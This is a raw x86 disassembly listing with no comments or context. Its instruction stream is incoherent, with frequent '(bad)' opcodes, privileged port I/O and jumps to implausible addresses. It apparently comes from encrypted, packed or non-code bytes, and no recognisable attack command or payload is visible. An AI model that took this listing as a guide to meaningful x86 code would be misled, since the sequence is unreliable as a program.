  40dd87:	js     0x40dd49
  40dd89:	addr16 push 0x7dab403f
  40dd8f:	fwait
  40dd90:	inc    eax
  40dd91:	lds    esi,FWORD PTR [ebp+0xe]
  40dd94:	repz cwde 
  40dd96:	dec    esi
  40dd97:	or     DWORD PTR [ebx+0x93389fc],ebx
  40dd9d:	sub    BYTE PTR [edi+esi*1],dh
  40dda0:	pop    ebp
  40dda1:	stos   BYTE PTR es:[edi],al
  40dda2:	fwait
  40dda3:	and    DWORD PTR [eax+0x425e445b],0x3d22713a
  40ddad:	cmp    eax,0x669dcbf8
  40ddb2:	dec    edi
  40ddb3:	out    0x5b,al
  40ddb5:	push   ebx
  40ddb6:	int    0x38
  40ddb8:	stos   DWORD PTR es:[edi],eax
  40ddb9:	dec    eax
  40ddba:	sub    al,0xfc
  40ddbc:	mov    ebp,DWORD PTR [ebx+0x242c09b5]
  40ddc2:	popa   
  40ddc3:	das    
  40ddc4:	push   ecx
  40ddc5:	loop   0x40ddb4
  40ddc7:	mov    al,dl
  40ddc9:	dec    edx
  40ddca:	(bad)  [eax+ebp*2-0x2938e7fd]
  40ddd1:	mov    ecx,0xf73c8e59
  40ddd6:	stos   BYTE PTR es:[edi],al
  40ddd7:	adc    ah,al
  40ddd9:	add    al,0x5b
  40dddb:	inc    esp
  40dddc:	ins    BYTE PTR es:[edi],dx
  40dddd:	test   eax,0x8d530951
  40dde2:	pop    ss
  40dde3:	or     al,0xf9
  40dde5:	out    dx,eax
  40dde6:	jns    0x40dd6a
  40dde8:	scas   eax,DWORD PTR es:[edi]
  40dde9:	add    al,0x15
  40ddeb:	sbb    edi,ebp
  40dded:	jo     0x40ddba
  40ddef:	into   
  40ddf0:	cmp    al,0xe8
  40ddf2:	cmc    
  40ddf3:	stc    
  40ddf4:	cmp    eax,0xfc088cd4
  40ddf9:	inc    eax
  40ddfa:	pop    ebp
  40ddfb:	clc    
  40ddfc:	lds    ecx,FWORD PTR [esi]
  40ddfe:	push   ecx
  40ddff:	adc    al,0x67
  40de01:	(bad)  
  40de02:	leave  
  40de03:	dec    edx
  40de04:	and    DWORD PTR [eax+0x690b4c39],eax
  40de0a:	loopne 0x40de4d
  40de0c:	(bad)  
  40de0d:	add    DWORD PTR [edi],ebp
  40de0f:	test   BYTE PTR [edx],ah
  40de11:	jg     0x40dde0
  40de13:	ins    DWORD PTR es:[edi],dx
  40de14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de15:	jl     0x40ddd7
  40de17:	jo     0x40de29
  40de19:	or     esp,ecx
  40de1b:	jae    0x40de08
  40de1d:	sbb    ebp,DWORD PTR [edx-0x74]
  40de20:	mov    eax,0xfdfd937d
  40de25:	push   es
  40de26:	in     al,0x83
  40de28:	mov    dh,0x90
  40de2a:	xchg   esi,eax
  40de2b:	sti    
  40de2c:	test   BYTE PTR [ecx],ah
  40de2e:	fmul   DWORD PTR [eax+esi*1-0x3e]
  40de32:	ins    DWORD PTR es:[edi],dx
  40de33:	or     al,0x1
  40de35:	jecxz  0x40de07
  40de37:	repnz mov ebp,0x8edb44b5
  40de3d:	mov    WORD PTR [esi],ds
  40de3f:	ret    
  40de40:	pop    ebx
  40de41:	data16 jbe 0x40de5f
  40de44:	jmp    0x51800db1
  40de49:	sbb    eax,0x184c42ce
  40de4e:	lea    edi,[esi+0x0]
  40de51:	call   0xc83758c5
  40de56:	or     ebp,ecx
  40de58:	out    dx,eax
  40de59:	dec    ebx
  40de5a:	push   edi
  40de5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de5c:	pop    esi
  40de5d:	iret   
  40de5e:	jns    0x40de2c
  40de60:	retf   
  40de61:	pusha  
  40de62:	out    dx,al
  40de63:	sbb    ebp,esp
  40de65:	out    dx,al
  40de66:	jno    0x40dec7
  40de68:	(bad)  
  40de69:	fdiv   DWORD PTR [ecx]
  40de6b:	popf   
  40de6c:	inc    esp
  40de6d:	cli    
  40de6e:	scas   eax,DWORD PTR es:[edi]
  40de6f:	xchg   ecx,eax
  40de70:	xor    BYTE PTR [edi+0x6f30fb3d],al
  40de76:	test   al,0xd4
  40de78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de79:	mov    BYTE PTR [edx-0x35],0xf7
  40de7d:	mov    eax,ds:0x4f822c3e
  40de82:	not    ecx
  40de84:	or     edi,DWORD PTR [edi+esi*2]
  40de87:	xchg   ebp,eax
  40de88:	mov    edx,0x796e063e
  40de8d:	adc    al,0xbc
  40de8f:	mov    ah,0x69
  40de91:	mov    al,ds:0x647380e
  40de96:	sbb    ah,bl
  40de98:	popa   
  40de99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de9a:	xchg   DWORD PTR [esi+0x6dbf572e],esp
  40dea0:	scas   al,BYTE PTR es:[edi]
  40dea1:	fstp   QWORD PTR [edi]
  40dea3:	nop
  40dea4:	pop    ss
  40dea5:	inc    esi
  40dea6:	add    bl,BYTE PTR [edx-0x44]
  40dea9:	push   esi
  40deaa:	mov    ebp,0x187491a2
  40deaf:	inc    ebx
  40deb0:	cld    
  40deb1:	mov    ch,0xbc
  40deb3:	clc    
  40deb4:	stos   BYTE PTR es:[edi],al
  40deb5:	fwait
  40deb6:	inc    edi
  40deb7:	loopne 0x40deca
  40deb9:	les    ebp,FWORD PTR [esi+0x75cfca64]
  40debf:	mov    ch,0xf3
  40dec1:	jns    0x40de60
  40dec3:	jmp    0x1df297ae
  40dec8:	pop    esp
  40dec9:	test   dh,dl
  40decb:	pop    es
  40decc:	dec    ebp
  40decd:	lock ds push edi
  40ded0:	cmp    dh,BYTE PTR [ebx-0x10]
  40ded3:	bound  edi,QWORD PTR [ebx-0x58]
  40ded6:	jl     0x40ded7
  40ded8:	lods   eax,DWORD PTR ds:[esi]
  40ded9:	sub    ah,bh
  40dedb:	jecxz  0x40deb6
  40dedd:	jecxz  0x40de92
  40dedf:	and    BYTE PTR [ecx],al
  40dee1:	xchg   ebp,eax
  40dee2:	adc    al,BYTE PTR [edx+0x5c]
  40dee5:	icebp  
  40dee6:	ret    0xaf72
  40dee9:	mov    ecx,0x222b5392
  40deee:	sti    
  40deef:	mov    edx,edi
  40def1:	pusha  
  40def2:	push   edi
  40def3:	push   ebp
  40def4:	cmp    DWORD PTR [esi],ebx
  40def6:	pop    ecx
  40def7:	call   0x1a88:0xb9d90425
  40defe:	mov    edx,DWORD PTR [ebp-0x329f996d]
  40df04:	mov    dh,0x66
  40df06:	cmp    al,cl
  40df08:	mov    eax,0xc8c47edf
  40df0d:	je     0x40df00
  40df0f:	sub    esi,DWORD PTR [ebx]
  40df11:	sti    
  40df12:	or     ch,BYTE PTR [eax]
  40df14:	retf   0xc96f
  40df17:	js     0x40df62
  40df19:	shl    DWORD PTR [edi+0x40],cl
  40df1c:	repz pop ecx
  40df1e:	pop    esp
  40df1f:	mul    DWORD PTR [edi-0x37]
  40df22:	das    
  40df23:	nop
  40df24:	pop    ds
  40df25:	outs   dx,DWORD PTR ds:[si]
  40df27:	dec    edi
  40df28:	pop    ss
  40df29:	mov    ch,BYTE PTR [ebx+0x17]
  40df2c:	or     BYTE PTR [ebp-0x3772d219],dh
  40df32:	inc    ebp
  40df33:	jp     0x40df3e
  40df35:	lods   eax,DWORD PTR ds:[esi]
  40df36:	lea    ecx,[esi]
  40df38:	pop    ss
  40df39:	and    BYTE PTR [ebx],dl
  40df3b:	in     al,dx
  40df3c:	test   dl,0xd2
  40df3f:	add    edi,DWORD PTR [ecx-0x425e8467]
  40df45:	add    edi,eax
  40df47:	shr    BYTE PTR [esi],1
  40df49:	fld    DWORD PTR ss:[ebx-0x43]
  40df4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df4e:	and    eax,0x32607dba
  40df53:	add    al,0x82
  40df55:	lahf   
  40df56:	dec    edx
  40df57:	mov    ds:0x86d0e63,al
  40df5c:	pop    ebx
  40df5d:	push   cs
  40df5e:	xor    al,0xd5
  40df60:	mov    eax,ds:0x9e8924f1
  40df65:	gs mov bh,0xc9
  40df68:	fcomp  DWORD PTR [ebp+0x48aef9f1]
  40df6e:	fldcw  WORD PTR [ebx+ebp*4]
  40df71:	mov    cl,0xdd
  40df73:	lods   al,BYTE PTR ds:[esi]
  40df74:	ror    ecx,cl
  40df76:	xchg   ebp,eax
  40df77:	mov    esp,0xe5eca331
  40df7c:	push   0xe6b7b9f6
  40df81:	mov    dh,0xdf
  40df83:	pushf  
  40df84:	ror    bh,cl
  40df86:	sbb    eax,0x41faedd7
  40df8b:	sub    dl,ah
  40df8d:	cwde   
  40df8e:	pop    ds
  40df8f:	shl    DWORD PTR [edi-0x6c52556a],1
  40df95:	pop    ss
  40df96:	jle    0x40df58
  40df98:	in     eax,dx
  40df99:	and    BYTE PTR [ecx+0x1f],bl
  40df9c:	neg    DWORD PTR [ebp+edi*8+0x7f0a77e5]
  40dfa3:	lods   al,BYTE PTR ds:[esi]
  40dfa4:	out    0xdd,eax
  40dfa6:	mov    BYTE PTR [ebp-0x7f2309a4],bl
  40dfac:	push   eax
  40dfad:	cmp    BYTE PTR [edx+0x30],bl
  40dfb0:	mov    al,ds:0x5a4b511d
  40dfb5:	aaa    
  40dfb6:	jae    0x40df99
  40dfb8:	mov    ebx,0xb9968835
  40dfbd:	cdq    
  40dfbe:	nop
  40dfbf:	pop    ecx
  40dfc0:	sub    al,0x43
  40dfc2:	dec    edi
  40dfc3:	jl     0x40e002
  40dfc5:	mov    ds:0x5aa63b2b,eax
  40dfca:	mov    esp,0x3ae37b2
  40dfcf:	mov    ebp,ecx
  40dfd1:	test   eax,0xc0d7bb45
  40dfd6:	xor    esp,DWORD PTR [esi]
  40dfd8:	das    
  40dfd9:	push   es
  40dfda:	push   ecx
  40dfdb:	call   0xc416ed7e
  40dfe0:	jge    0x40e038
  40dfe2:	jl     0x40dfac
  40dfe4:	jl     0x40df72
  40dfe6:	(bad)  
  40dfe7:	test   eax,0x15093d7c
  40dfec:	aas    
  40dfed:	sbb    al,0x73
  40dfef:	cmp    dl,BYTE PTR [eax]
  40dff1:	mov    ss,WORD PTR [edx]
  40dff3:	stos   BYTE PTR es:[edi],al
  40dff4:	jo     0x40dfb0
  40dff6:	stos   DWORD PTR es:[edi],eax
  40dff7:	int3   
  40dff8:	cmp    ch,BYTE PTR ds:0x1e8adff
  40dffe:	pop    ss
  40dfff:	ds sbb al,0x57
  40e002:	sub    al,0x6d
  40e004:	int3   
  40e005:	repnz sti 
  40e007:	ds into 
  40e009:	inc    edi
  40e00a:	outs   dx,BYTE PTR ds:[esi]
  40e00b:	add    eax,0x230d552b
  40e010:	mov    al,0xc1
  40e012:	mov    bl,0xeb
  40e014:	sub    al,bl
  40e016:	leave  
  40e017:	scas   eax,DWORD PTR es:[edi]
  40e018:	push   ebx
  40e019:	xchg   DWORD PTR [ebp+0x64c3e017],edx
  40e01f:	inc    edi
  40e020:	adc    BYTE PTR [edx+0x15ad126],ch
  40e026:	xchg   esp,eax
  40e027:	fistp  WORD PTR [esi+edi*8+0x768c8841]
  40e02e:	push   cs
  40e02f:	stos   DWORD PTR es:[edi],eax
  40e030:	cmp    al,0xf8
  40e032:	test   eax,eax
  40e034:	and    eax,0x287cc680
  40e039:	pushf  
  40e03a:	addr16 iret 
  40e03c:	add    DWORD PTR [ebx+edx*4+0x1d],eax
  40e040:	leave  
  40e041:	outs   dx,BYTE PTR ds:[esi]
  40e042:	xor    eax,0x278d3deb
  40e047:	ins    DWORD PTR es:[edi],dx
  40e048:	imul   edi,esp,0x9
  40e04b:	jp     0x40dffb
  40e04d:	ins    DWORD PTR es:[edi],dx
  40e04e:	dec    ebx
  40e04f:	sub    eax,0xf2897ec8
  40e054:	and    cl,BYTE PTR [edx+0x4d3c1d0f]
  40e05a:	loop   0x40dfef
  40e05c:	scas   eax,DWORD PTR es:[edi]
  40e05d:	or     BYTE PTR [ebx],0x2d
  40e060:	xor    eax,0x866e9313
  40e065:	dec    esi
  40e066:	in     al,0xec
  40e068:	mov    dl,0xe4
  40e06a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e06b:	add    eax,0xabfde23f
  40e070:	sar    BYTE PTR [edi+0xb21fd9b],0x76
  40e077:	je     0x40e010
  40e079:	xchg   ebp,eax
  40e07a:	inc    esi
  40e07b:	(bad)  
  40e07c:	add    esp,ebp
  40e07e:	dec    ebx
  40e07f:	frstor [edi+0x10]
  40e082:	aam    0xd9
  40e084:	mov    al,0x27
  40e086:	push   edx
  40e087:	sbb    edi,DWORD PTR fs:[eax]
  40e08a:	mov    ebp,0x53a06bf5
  40e08f:	ret    0x73ce
  40e092:	repnz cmc 
  40e094:	and    ecx,DWORD PTR [esi-0x18]
  40e097:	mov    ebx,0xdfe7b12d
  40e09c:	mov    DWORD PTR [ebp+0x1c299e93],esp
  40e0a2:	fcom   DWORD PTR [ebp-0x10420da7]
  40e0a8:	jge    0x40e073
  40e0aa:	popf   
  40e0ab:	fisubr DWORD PTR ds:0xc39b2569
  40e0b1:	out    dx,al
  40e0b2:	lods   eax,DWORD PTR ds:[esi]
  40e0b3:	inc    eax
  40e0b4:	cmp    DWORD PTR [ecx*4+0x22db5ca2],0xffffff86
  40e0bc:	lods   eax,DWORD PTR ds:[esi]
  40e0bd:	aad    0xc0
  40e0bf:	or     DWORD PTR [ecx+eiz*4+0x50],esi
  40e0c3:	mov    esp,0x56ed7b4a
  40e0c8:	popf   
  40e0c9:	jne    0x40e123
  40e0cb:	adc    eax,0x9413600a
  40e0d0:	or     BYTE PTR [edi],al
  40e0d2:	gs out 0xfb,ax
  40e0d6:	adc    BYTE PTR [ecx-0x3e],0xc3
  40e0da:	sub    bh,0xf3
  40e0dd:	lods   al,BYTE PTR ss:[esi]
  40e0df:	mov    ah,0x63
  40e0e1:	or     DWORD PTR ds:0x40b57898,edi
  40e0e7:	ins    DWORD PTR es:[edi],dx
  40e0e8:	fsub   st(5),st
  40e0ea:	repz ja 0x40e12e
  40e0ed:	inc    ebp
  40e0ee:	push   esp
  40e0ef:	and    edx,eax
  40e0f1:	lahf   
  40e0f2:	icebp  
  40e0f3:	jg     0x40e09e
  40e0f5:	out    0x1d,al
  40e0f7:	call   0xc2d928e8
  40e0fc:	inc    esi
  40e0fd:	into   
  40e0fe:	cdq    
  40e0ff:	rep lods eax,DWORD PTR ds:[esi]
  40e101:	js     0x40e11a
  40e103:	xchg   edx,eax
  40e104:	fucomip st,st(5)
  40e106:	add    ebp,DWORD PTR [ecx+0x3180f364]
  40e10c:	sbb    eax,0x3d7fefd9
  40e111:	shl    BYTE PTR [ebp+edx*1-0x7e],cl
  40e115:	test   DWORD PTR [edi-0x688c4735],0xe384428f
  40e11f:	out    0x50,eax
  40e121:	push   ebx
  40e122:	xchg   ebp,eax
  40e123:	mov    bl,al
  40e125:	stos   BYTE PTR es:[edi],al
  40e126:	adc    dl,0x51
  40e129:	or     bl,BYTE PTR [esi-0x77d40677]
  40e12f:	mov    eax,0xc877e92c
  40e134:	sar    BYTE PTR [eax-0x4b],cl
  40e137:	daa    
  40e138:	das    
  40e139:	dec    eax
  40e13a:	xchg   esi,eax
  40e13b:	mov    edi,0x831a1a1c
  40e140:	jmp    0xf51370d
  40e145:	nop
  40e146:	scas   eax,DWORD PTR es:[edi]
  40e147:	cmp    al,0x3f
  40e149:	iret   
  40e14a:	imul   ecx,DWORD PTR [edx+eiz*8],0xc6add2e2
  40e151:	jmp    FWORD PTR [ebx]
  40e153:	xchg   esp,eax
  40e154:	pop    edx
  40e155:	inc    ebx
  40e156:	test   al,0xaf
  40e158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e159:	cmp    dh,BYTE PTR [ebx-0x459958af]
  40e15f:	jge    0x40e119
  40e161:	or     bl,ch
  40e163:	pop    ebx
  40e164:	(bad)  
  40e165:	dec    BYTE PTR [eax]
  40e167:	stos   DWORD PTR es:[edi],eax
  40e168:	cmp    WORD PTR [esi+0x3ace816a],0x68
  40e170:	test   BYTE PTR [edi],ch
  40e172:	add    BYTE PTR [ecx+esi*8+0x1c0a695f],0x6a
  40e17a:	pop    es
  40e17b:	push   ss
  40e17c:	xor    ecx,edi
  40e17e:	out    dx,al
  40e17f:	cwde   
  40e180:	addps  xmm7,XMMWORD PTR [esi-0x55dc4eb0]
  40e187:	in     eax,dx
  40e188:	cmovnp ecx,DWORD PTR [ebx]
  40e18b:	xor    BYTE PTR [ecx-0x11e93710],0xd5
  40e192:	fs mov eax,0x457bdd60
  40e198:	mov    dh,0x9f
  40e19a:	pop    ss
  40e19b:	adc    cl,BYTE PTR [ebx+0x7a9680c9]
  40e1a1:	addr16 retf 
  40e1a3:	pop    ds
  40e1a4:	add    esi,eax
  40e1a6:	stc    
  40e1a7:	xchg   esi,eax
  40e1a8:	sbb    eax,DWORD PTR [ecx-0x5a]
  40e1ab:	sbb    eax,0xbc9bc843
  40e1b0:	rcl    dl,cl
  40e1b2:	push   esi
  40e1b3:	enter  0xbaa7,0xa6
  40e1b7:	xchg   cl,dl
  40e1b9:	int3   
  40e1ba:	or     ebx,DWORD PTR [ecx]
  40e1bc:	fbld   TBYTE PTR [edi+0x4941f203]
  40e1c2:	and    ebx,eax
  40e1c4:	mov    al,0x81
  40e1c6:	add    dh,BYTE PTR [ecx-0x39]
  40e1c9:	dec    edx
  40e1ca:	and    eax,0x43caf5e0
  40e1cf:	ins    DWORD PTR es:[edi],dx
  40e1d0:	pop    edi
  40e1d1:	jbe    0x40e180
  40e1d3:	scas   al,BYTE PTR es:[edi]
  40e1d4:	test   DWORD PTR [ebx*8-0x730e87da],esp
  40e1db:	cld    
  40e1dc:	adc    DWORD PTR [edi+ebp*2-0x65],ebp
  40e1e0:	cmp    DWORD PTR [esi+0x62],0xc4e19601
  40e1e7:	push   ds
  40e1e8:	cli    
  40e1e9:	push   ebx
  40e1ea:	mov    ds:0xf8328b4d,eax
  40e1ef:	add    dh,bl
  40e1f1:	mov    BYTE PTR ds:0xcf5a1916,cl
  40e1f7:	ds adc esp,0x4e1ef6c9
  40e1fe:	mov    ?,ebx
  40e200:	pop    edx
  40e201:	vpor   ymm5,ymm6,YMMWORD PTR [ecx+0x3a682052]
  40e209:	inc    ecx
  40e20a:	out    dx,eax
  40e20b:	lea    ebp,[edx+edx*8+0xa]
  40e20f:	rol    DWORD PTR [ecx+0x37],cl
  40e212:	test   bl,dl
  40e214:	sub    edi,edi
  40e216:	cli    
  40e217:	jne    0x40e22d
  40e219:	or     edx,ebx
  40e21b:	lods   eax,DWORD PTR ds:[esi]
  40e21c:	(bad)  
  40e21d:	fld    st(5)
  40e21f:	xor    eax,0xae361db9
  40e224:	jg     0x40e1e1
  40e226:	mov    ds:0x3f9074b0,eax
  40e22b:	sbb    al,0x12
  40e22d:	scas   eax,DWORD PTR es:[edi]
  40e22e:	mov    dl,0x14
  40e230:	jb     0x40e266
  40e232:	mov    cl,0x78
  40e234:	lods   eax,DWORD PTR ds:[esi]
  40e235:	or     dl,cl
  40e237:	mov    eax,0xad46135f
  40e23c:	int3   
  40e23d:	sti    
  40e23e:	retf   
  40e23f:	mov    bl,0x2e
  40e241:	retf   0xc8d3
  40e244:	divps  xmm3,XMMWORD PTR [ebp+0x1582bd42]
  40e24b:	mov    esp,0x40eac3cb
  40e250:	cmp    DWORD PTR [ebp-0x68],0xffffffe7
  40e254:	loop   0x40e1f1
  40e256:	aad    0x2a
  40e258:	mov    ebp,0x3ee261f1
  40e25d:	sar    esp,1
  40e25f:	or     ebp,DWORD PTR [ebx+ecx*4]
  40e262:	fcom   st(6)
  40e264:	push   ebp
  40e265:	jbe    0x40e283
  40e267:	neg    BYTE PTR [ecx]
  40e269:	nop
  40e26a:	sbb    dh,BYTE PTR [esp+esi*1]
  40e26d:	mov    edi,DWORD PTR [edx+0x7e2825dc]
  40e273:	add    eax,eax
  40e275:	mov    dh,0xbe
  40e277:	jl     0x40e24f
  40e279:	neg    DWORD PTR ds:0xa48e5543
  40e27f:	push   ss
  40e280:	sbb    al,0x59
  40e282:	je     0x40e214
  40e284:	cmp    BYTE PTR [ecx+0x36],ch
  40e287:	(bad)  
  40e288:	sub    eax,0x2d155dab
  40e28d:	mov    al,0x7b
  40e28f:	fsubp  st(4),st
  40e291:	xchg   edi,eax
  40e292:	stos   BYTE PTR es:[edi],al
  40e293:	mov    esi,fs
  40e295:	lea    esp,[esi-0x37]
  40e298:	inc    ecx
  40e299:	jne    0x40e2e8
  40e29b:	xlat   BYTE PTR ds:[ebx]
  40e29c:	push   0x50
  40e29e:	jp     0x40e2ba
  40e2a0:	sti    
  40e2a1:	arpl   WORD PTR [ebx-0x41ed700f],cx
  40e2a7:	xchg   edi,eax
  40e2a8:	and    BYTE PTR [esp+eax*2],ah
  40e2ab:	retf   
  40e2ac:	call   0xe0d6:0xf4212b55
  40e2b3:	cwde   
  40e2b4:	adc    al,0xdf
  40e2b6:	push   es
  40e2b7:	imul   edi,DWORD PTR [ebx],0xffffffd2
  40e2ba:	in     eax,dx
  40e2bb:	pop    eax
  40e2bc:	mov    bl,0xda
  40e2be:	jle    0x40e26f
  40e2c0:	jmp    DWORD PTR [ebp+0x7d]
  40e2c3:	test   DWORD PTR [ebx],ebp
  40e2c5:	jge    0x40e318
  40e2c7:	aas    
  40e2c8:	test   eax,0xa05c6fc4
  40e2cd:	pop    ebp
  40e2ce:	(bad)  
  40e2cf:	stos   BYTE PTR es:[edi],al
  40e2d0:	and    BYTE PTR [ebp+0x54e86de4],cl
  40e2d6:	mov    ah,bl
  40e2d8:	gs test al,0xe7
  40e2db:	sbb    DWORD PTR [edx-0x3e084c8b],ecx
  40e2e1:	imul   esp,DWORD PTR [edx+0x34],0x49
  40e2e5:	out    dx,al
  40e2e6:	sbb    dh,BYTE PTR [ecx+eax*4+0x30e1d72d]
  40e2ed:	(bad)  
  40e2ef:	addr16 mov edi,0x357a5622
  40e2f5:	icebp  
  40e2f6:	sub    bh,0xff
  40e2f9:	xchg   ebx,eax
  40e2fa:	les    edx,FWORD PTR [edi+0x77047d7c]
  40e300:	jb     0x40e2d8
  40e302:	dec    esp
  40e303:	inc    ebx
  40e304:	mov    ah,0x67
  40e306:	mov    al,ds:0x39bacbe3
  40e30b:	pushf  
  40e30c:	push   ecx
  40e30d:	push   es
  40e30e:	xchg   edi,eax
  40e30f:	outs   dx,BYTE PTR ds:[esi]
  40e310:	in     eax,dx
  40e311:	inc    esp
  40e312:	push   esp
  40e313:	loopne 0x40e2cb
  40e315:	dec    edi
  40e316:	sub    al,0x35
  40e318:	xchg   ebx,eax
  40e319:	fisub  DWORD PTR [ebx]
  40e31b:	retf   0x7497
  40e31e:	sub    al,0x88
  40e320:	ror    BYTE PTR [edx-0x5daa9386],1
  40e326:	sbb    DWORD PTR [edi-0x6804b3fa],ebp
  40e32c:	fwait
  40e32d:	sbb    ecx,DWORD PTR [ecx+eax*8-0x58486218]
  40e334:	out    dx,eax
  40e335:	add    DWORD PTR [edi-0xae08bbe],edx
  40e33b:	lock inc esp
  40e33d:	jbe    0x40e30a
  40e33f:	fld    TBYTE PTR [esi]
  40e341:	call   0x3c1b58a
  40e346:	cli    
  40e347:	stc    
  40e348:	adc    cl,BYTE PTR [ebx-0x3]
  40e34b:	sbb    al,0xe6
  40e34d:	sub    dl,BYTE PTR [edx]
  40e34f:	and    ch,BYTE PTR [esi]
  40e351:	pop    esi
  40e352:	mov    ebx,0x86e7f5dd
  40e357:	jge    0x40e338
  40e359:	std    
  40e35a:	or     cl,dl
  40e35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e35d:	dec    esp
  40e35e:	repz ret 0x20bf
  40e362:	push   0x7f0900e3
  40e367:	sub    bh,bl
  40e369:	push   eax
  40e36a:	leave  
  40e36b:	aad    0x3c
  40e36d:	sub    esi,DWORD PTR [edx-0x7def8f0]
  40e373:	lahf   
  40e374:	dec    edi
  40e375:	add    ch,BYTE PTR [eax+0x3f]
  40e378:	pop    edx
  40e379:	out    0x73,eax
  40e37b:	push   ebx
  40e37c:	xchg   esi,eax
  40e37d:	pusha  
  40e37e:	scas   al,BYTE PTR es:[edi]
  40e37f:	aad    0xdb
  40e381:	inc    eax
  40e382:	dec    ecx
  40e383:	or     esp,DWORD PTR [esi-0x40]
  40e386:	xor    BYTE PTR [esi+0x21],0xe6
  40e38a:	jbe    0x40e35e
  40e38c:	push   ebp
  40e38d:	mov    ch,0x5
  40e38f:	es aas 
  40e391:	fcomp  st(2)
  40e393:	lahf   
  40e394:	and    bl,BYTE PTR [edi]
  40e396:	aas    
  40e397:	xor    BYTE PTR [ebp+0x76763fb9],al
  40e39d:	inc    ebp
  40e39e:	lea    edx,[ebp+0x5a]
  40e3a1:	ins    DWORD PTR es:[edi],dx
  40e3a2:	jne    0x40e38a
  40e3a4:	pop    edi
  40e3a5:	jae    0x40e381
  40e3a7:	fld    QWORD PTR [ecx]
  40e3a9:	dec    ebp
  40e3aa:	in     al,dx
  40e3ab:	retf   
  40e3ac:	stos   BYTE PTR es:[edi],al
  40e3ad:	cld    
  40e3ae:	push   ebp
  40e3af:	mov    ebp,0xcd588ae
  40e3b4:	test   al,0x2d
  40e3b6:	xor    eax,0x233b085f
  40e3bb:	cmp    bl,dh
  40e3bd:	(bad)  
  40e3be:	out    dx,al
  40e3bf:	mov    WORD PTR [edx],?
  40e3c1:	fild   QWORD PTR [ecx-0x67a846e4]
  40e3c7:	mov    es,WORD PTR [ecx]
  40e3c9:	mov    al,BYTE PTR [edi+ebx*4+0x5a]
  40e3cd:	dec    edi
  40e3ce:	aaa    
  40e3cf:	sub    BYTE PTR [ebp+0x5e],bl
  40e3d2:	xchg   esi,eax
  40e3d3:	jb     0x40e3b5
  40e3d5:	pop    ss
  40e3d6:	cli    
  40e3d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3d8:	fsub   DWORD PTR [edi]
  40e3da:	das    
  40e3db:	cs jle 0x40e3bd
  40e3de:	es add eax,0xaa29d423
  40e3e4:	pop    ebx
  40e3e5:	aad    0x8a
  40e3e7:	mov    BYTE PTR [esi],dl
  40e3e9:	xor    edx,DWORD PTR [eax]
  40e3eb:	mov    cl,0xba
  40e3ed:	mov    ah,ch
  40e3ef:	out    dx,al
  40e3f0:	dec    ebx
  40e3f1:	out    0xa5,eax
  40e3f3:	fadd   st,st(3)
  40e3f5:	and    BYTE PTR [edi+0x36e7e550],ch
  40e3fb:	mov    edi,0x7ed7d7c
  40e400:	dec    ebp
  40e401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e402:	out    0x16,al
  40e404:	xchg   ebx,eax
  40e405:	inc    esi
  40e406:	dec    ebp
  40e407:	lea    esp,[esi-0x543b05e3]
  40e40d:	mov    ecx,0x6353a579
  40e412:	jmp    0x76ad:0x44006e3f
  40e419:	lock and BYTE PTR [ebp-0x5fcabb66],bl
  40e420:	xchg   ecx,eax
  40e421:	mov    bh,0xfc
  40e423:	and    ah,BYTE PTR [ebx+0x1a]
  40e426:	mov    DWORD PTR [eax-0x3],edi
  40e429:	mov    ebx,0x4648b85c
  40e42e:	mov    DWORD PTR [esi],0x6b6b7609
  40e434:	inc    ebx
  40e435:	xor    al,0x51
  40e437:	loopne 0x40e46f
  40e439:	cwde   
  40e43a:	mov    ebp,0x7c0cbcb7
  40e43f:	in     al,0x50
  40e441:	jl     0x40e4ae
  40e443:	push   0x514a046c
  40e448:	lahf   
  40e449:	fwait
  40e44a:	ja     0x40e3fe
  40e44c:	ja     0x40e4cb
  40e44e:	push   ds
  40e44f:	scas   eax,DWORD PTR es:[edi]
  40e450:	fwait
  40e451:	inc    ebp
  40e452:	pop    edi
  40e453:	and    esp,eax
  40e455:	fist   WORD PTR [edx]
  40e457:	mov    ds:0x96722628,eax
  40e45c:	outs   dx,DWORD PTR ds:[esi]
  40e45e:	mov    bh,0xac
  40e460:	mov    ecx,0xfc98e2c9
  40e465:	xchg   ecx,eax
  40e466:	jo     0x40e408
  40e468:	out    dx,al
  40e469:	stos   BYTE PTR es:[edi],al
  40e46a:	fs xchg ecx,ebx
  40e46d:	data16 sub ch,BYTE PTR [edi]
  40e470:	mov    cl,0xc2
  40e472:	xlat   BYTE PTR ds:[ebx]
  40e473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e474:	mov    cl,0xc6
  40e476:	shl    BYTE PTR [eax],cl
  40e478:	stc    
  40e479:	and    eax,0x278092e
  40e47e:	add    bh,BYTE PTR [ecx]
  40e480:	sub    al,0xf9
  40e482:	(bad)  
  40e483:	xor    dh,BYTE PTR [esi-0x302de5f]
  40e489:	test   al,0x11
  40e48b:	(bad)  
  40e48c:	sbb    al,0x24
  40e48e:	adc    BYTE PTR [ecx-0x7edc8205],bl
  40e494:	jae    0x40e426
  40e496:	xchg   DWORD PTR [esi-0x530e5b7],ecx
  40e49c:	pop    ebx
  40e49d:	mov    cl,0x56
  40e49f:	pusha  
  40e4a0:	push   cs
  40e4a1:	arpl   WORD PTR [esi+ebp*1+0x7b5ec0b0],dx
  40e4a8:	mov    ebx,0x125ea63b
  40e4ad:	pop    ds
  40e4ae:	idiv   ecx
  40e4b0:	dec    ebp
  40e4b1:	ds add eax,0xd4ce287b
  40e4b7:	(bad)  
  40e4b8:	xchg   ebp,eax
  40e4b9:	mov    bl,0x21
  40e4bb:	xchg   esi,eax
  40e4bc:	mov    DWORD PTR [ecx+0x2c],edi
  40e4bf:	sbb    ebx,eax
  40e4c1:	sub    ebp,DWORD PTR [edx-0x770b633f]
  40e4c7:	rol    DWORD PTR ss:[edi+0x37],0x78
  40e4cc:	jb     0x40e4bd
  40e4ce:	push   eax
  40e4cf:	mov    bl,0x6a
